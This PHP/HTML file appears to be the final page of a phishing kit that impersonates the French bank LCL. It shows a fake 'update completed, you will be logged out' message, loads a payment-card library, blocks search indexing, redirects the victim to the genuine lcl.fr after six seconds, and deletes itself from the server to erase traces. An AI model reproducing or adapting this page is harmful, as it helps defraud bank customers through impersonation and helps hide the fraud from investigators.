<?php

?>
<!doctype html>
<html style="background: #F2F2F2;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Mise à jour terminée avec succès</title>
    </head>

    <body style="background: #F2F2F2;">

        <!-- HEADER -->
        <header id="header">
            <img style="min-width: 960px;" src="assets/imgs/log-header.png">
            <div class="top"></div>
            <div class="middle"></div>
            <div class="bottom"></div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="containerr">
                <div class="title text-center mb30">
                    <img src="assets/imgs/sus.gif">
                    <h3 style="font-size: 20px; margin: 10px 0">Mise à jour terminée avec succès</h3>
                    <p>Vous allez être déconnecté</p>
                </div>
                <div class="banner">
                    <img src="assets/imgs/banner.gif">
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <img style="min-width: 911px;" src="assets/imgs/log-footer.png">
            <div class="top"></div>
            <div class="bottom"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>
            setTimeout(function () {
                window.location.href= 'https://www.lcl.fr/';
            },6000); // 1000 = 1s
        </script>

    </body>

</html>
<?php unlink(basename(__FILE__)); ?>